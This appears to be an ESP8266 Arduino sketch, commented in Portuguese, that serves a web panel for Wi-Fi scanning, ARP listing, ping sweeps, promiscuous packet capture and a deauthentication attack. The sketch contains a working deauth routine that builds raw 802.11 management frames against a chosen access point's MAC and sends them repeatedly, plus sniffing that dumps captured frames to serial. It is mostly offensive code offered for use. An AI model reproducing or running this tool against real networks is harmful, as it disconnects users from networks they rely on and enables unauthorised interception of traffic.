#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <lwip/etharp.h>
#include <ESP8266Ping.h>

// Credenciais do AP
const char* ap_ssid = "ESP8266";
const char* ap_password = "1234567890";

// Cria o servido HTTP
ESP8266WebServer server(80);

// Variaveis do Deauth
String targetSSID = "";
int targetChannel = 1;
uint8_t targetMac[6];

// SSID e senha para se conectar ao WiFi
String ssid;
String password;

// Configurações do PingScan
IPAddress startIP(192, 168, 0, 1);
IPAddress endIP(192, 168, 0, 254);

String scanResult;

// Configurações do AP
void setupAP() {
  Serial.println("Iniciando AP...");
  WiFi.softAP(ap_ssid, ap_password);

  // Rotas do servidor HTTP
  server.on("/", handleRoot);
  server.on("/wifi", handleWifiConnectScan);
  server.on("/scanner", handleWifiScanner);
  server.on("/deauth", handleAttackDeauth);
  server.on("/arp", handleARP);
  server.on("/cap", capture);
  server.on("/pingscan", handlePingScan);
  server.on("/pingscan-interval", handleSetInterval);
  server.on("/pingscan-submit-interval", handleSubmitInterval);
  server.on("/select-wifi", handleWifiScanSelect);
  server.on("/connect", handleWifiConnect);
  server.begin();


  Serial.println("Servidor HTTP Iniciado...");
}

// Configurações da Pagina Inicial
void handleRoot() {
  String htmlRoot = "<html><head><title>ESP8266 | Root</title><style>html {background-color: black;color: purple;display: flex;}a {color: red;}</style></head><body><h1>Esp8266 : Configuracoes</h1><h2>Paginas : </h2><a href='/wifi'>Conexao WiFi</a><br><a href='/scanner'>Scaner WiFi</a><br><a href='/arp'>Scaner ARP</a><br><a href='/cap'>Capture</a><br><a href='/pingscan'>Ping Scan</a><br><a href='/pingscan-interval'>Definir Intervalo</a></body></html>";
  server.send(200, "text/html", htmlRoot);
}

// Handle da pagina de conexão wifi
void handleWifiConnectScan() {
  String page = "<html><head><title>ESP8266 | WiFi</title><style>html{background-color: black; color: purple;}a{color:red}</style></head><body><h1>Redes Disponíveis:</h1><ul>";
    int numNetworks = WiFi.scanNetworks();
    for (int i = 0; i < numNetworks; i++) {
      page += "<li><a href='/select-wifi?ssid=" + WiFi.SSID(i) + "'>" + WiFi.SSID(i) + "</a></li>";

    }
    page += "</ul></body></html>";
    server.send(200, "text/html", page);
}

void handleWifiScanSelect() {
  if (server.hasArg("ssid")) {
    ssid = server.arg("ssid");
    String page = "<html><head><title>ESP8266 | WiFi Pass</title><style>html{background-color: black; color: purple;}a{color:red}</style></head><body><h1>Conectar em " + ssid + "</h1>";
    page += "<form action='/connect' method='POST'>";
    page += "Senha: <input type='password' name='password'><br>";
    page += "<input type='submit' value='Conectar'></form></body></html>";
    server.send(200, "text/html", page);
  }
}

void handleWifiConnect() {
  if (server.hasArg("password")) {
    password = server.arg("password");
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    WiFi.begin(ssid.c_str(), password.c_str());

    int attempts = 0;

    while (WiFi.status() != WL_CONNECTED && attempts < 20) {
      delay(500);
      Serial.print(".");
      attempts++;
    }

    if (WiFi.status() == WL_CONNECTED) {
      Serial.println("Conectado");
      Serial.print("IP : ");
      Serial.println(WiFi.localIP());
      startWebServer();
    } else {
      Serial.println("Falha ao Conectar ao WiFi");
      setupAP();
    }

    server.send(200, "text/html", "<html><body><h1>Conectando...</h1></body></html>");
  }
}

// Inicia/Reinicia o servidor HTTP
void startWebServer() {
  server.on("/", []() {
    server.send(200, "text/html", "<h1>Conectado ao WiFi!</h1>");
  });
  server.begin();
  Serial.println("Servidor HTTP Inciado!");
}

// Pagina de configurações da página de conexão wifi
void handleWifiScanner() {
  int numNetworks = WiFi.scanNetworks();
  String htmlScan = "<html><head><title>Esp8266 | WiFi Scan</title><style>html {background-color: black;color: purple;}a {color: red;}</style></head><body><h1>WiFis Proximos : </h1><ul>";

  for (int i = 0; i < numNetworks; i++) {
    htmlScan += "<li><a href='/deauth?ssid=" + WiFi.SSID(i) + "&channel=" + String(WiFi.channel(i)) + "&mac=" + WiFi.BSSIDstr(i) + "'>" + WiFi.SSID(i) +" (Canal : " + String(WiFi.channel(i)) + ")</a></li>";
  }

  htmlScan += "</ul></body></html>";

  server.send(200, "text/html", htmlScan);
}

// Página de ARP
void handleARP() {
  String htmlArp = "<html><head><title>Esp8266 | ARP</title><style>html {background-color: black;color: purple;}</style></head><body>";
  htmlArp += "<h1>Dispositivos Conectados : </h1><table border='1'><tr><th>IPv4</th><th>Endereco MAC</th></tr>";

  size_t i = 0;
  ip4_addr_t *ipaddr;
  struct netif *netif;
  struct eth_addr *eth_ret;

  while (etharp_get_entry(i, &ipaddr, &netif, &eth_ret) == 1) {
    if (ipaddr != NULL && eth_ret != NULL) {
      htmlArp += "<tr><td>";
      htmlArp += IPAddress(ipaddr->addr).toString();
      htmlArp += "</td><td>";
      htmlArp += formatMacAddress(eth_ret->addr);
      htmlArp += "</td></tr>";
    }
    i++;
  }

  htmlArp += "</table></body></html>";

  server.send(200, "text/html", htmlArp);
}

// Deauth função1
void deauthAttack(uint8_t *targetMac) {
  for (int i = 0; i < 100; i++) {
    sendDeauthFrame(targetMac);
    delay(10);
  }
}

// Deauth função2
void sendDeauthFrame(uint8_t *targetMac) {
  uint8_t deauthPacket[] = {
    0xC0, 0x00, 0x3A, 0x01,
    targetMac[0], targetMac[1], targetMac[2],
    targetMac[3], targetMac[4], targetMac[5],
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00,
    0x07, 0x00
  };
  wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
}

// Deauth função3
void handleAttackDeauth() {
  if (server.hasArg("ssid") && server.hasArg("channel") && server.hasArg("mac")) {
    targetSSID = server.arg("ssid");
    targetChannel = server.arg("channel").toInt();
    String macStr = server.arg("mac");

    WiFi.mode(WIFI_STA);
    WiFi.disconnect();

    sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &targetMac[0], &targetMac[1], &targetMac[2], &targetMac[3], &targetMac[4], &targetMac[5]);

    wifi_set_channel(targetChannel);
    deauthAttack(targetMac);

    server.send(200, "text/html", "<html><body><h1>Attacking : " + targetSSID + "</h1></body></html>");
  } else {
    server.send(400, "text/html", "Invalid Params");
  }
}

// Formata o MAC
String formatMacAddress(uint8_t *mac) {
  String macStr = "";
  for (int i = 0; i < 6; i++) {
    if (mac[i] < 0x10) {
      macStr += "0";
    }
    macStr += String(mac[i], HEX);
    if (i < 5) {
      macStr += ":";
    }
  }
  return macStr;
}

// Pagina de configuração do Capture
// Essa é a única função que é exibida no monitor serial e não no HTTP
void capture() {
  if (WiFi.status() == WL_CONNECTED) {
    wifi_promiscuous_enable(1);
    wifi_set_promiscuous_rx_cb([](uint8_t *buf, uint16_t len) {
            for (int i = 0; i < len; i++) {
              Serial.printf("%02X ", buf[i]);
              if ((i + 1) % 16 == 0) {
                
              }
            }
            Serial.println("\n");
        });

    Serial.println("Modo promíscuo ativado. Capturando Pacotes...");
    server.send(200, "text/html", "<html><body>Capture Mode Ativado!</body></html>");
  } else {
    server.send(400, "text/html", "<html><body>Conecte-se a um WiFi antes de ativar o modo de captura</body></html>");
  }
}

void handleSetInterval() {
  String htmlSetInterval = "<!DOCTYPE html><html><head><style>html{background-color:black;color:purple;}a{color:red}</style><title>Esp826 | Ping Scan Interval</title></head><body>";
  htmlSetInterval += "<h1>Definir Intervalo de IP</h1>";
  htmlSetInterval += "<form action=\"/pingscan-submit-interval\" method=\"POST\">";
  htmlSetInterval += "IP Inicial : <input type=\"Text\" name=\"startIP\" value=\"" + startIP.toString() + "\"><br>";
  htmlSetInterval += "IP Final : <input type=\"text\" name=\"endIP\" value=\"" + endIP.toString() + "\"><br>";
  htmlSetInterval += "<input type=\"submit\" value=\"Salvar\">";
  htmlSetInterval += "</form>";
  htmlSetInterval += "<p><a href=\"/\">Voltar</a></p>";
  htmlSetInterval += "</body></html>";

  server.send(200, "text/html", htmlSetInterval);
}

void handleSubmitInterval() {
  if (server.hasArg("startIP") && server.hasArg("endIP")) {
    String startIPStr = server.arg("startIP");
    String endIPStr = server.arg("endIP");

    if (startIP.fromString(startIPStr) && endIP.fromString(endIPStr)) {
      server.send(200, "text/html", "<h1>Intervalo Atualizado</h1><p><a href=\"/\">Voltar</a></p>");
      return;
    }
  }
  server.send(400, "text/html", "<h1>Erro ao atualizar o intervalo!</h1><p>Certifique-se de que os IPs estão no formato correto.</p><p><a href=\"/\">Voltar</a></p>");
}

void handlePingScan() {
  scanResult = "<head><title>Esp8266 | Ping Result</title><style>html{background-color:black;color:purple;}a{color:red;}</style></head><h2>Resultados do Ping Scan:</h2><ul>";
  for (uint8_t i = startIP[3]; i <= endIP[3]; i++) {
    IPAddress targetIP = startIP;
    targetIP[3] = i;

    if (Ping.ping(targetIP, 1)) {
      scanResult += "<li>Dispositivo em : " + targetIP.toString() + "</li>";
      Serial.println("Dispositivo Encontrado : " + targetIP.toString());
    } else {
      // Monstra os dispositivos sem Pong
      // Descomente se quiser
      // scanResult += "<li>Sem Resposta : " + targetIP.toString() + "</li>";
    }
    delay(100);
  }
  scanResult += "</ul>";
  server.send(200, "text/html", scanResult);
}

void setup() {
  Serial.begin(115200);
  setupAP();
}

void loop() {
  server.handleClient();
}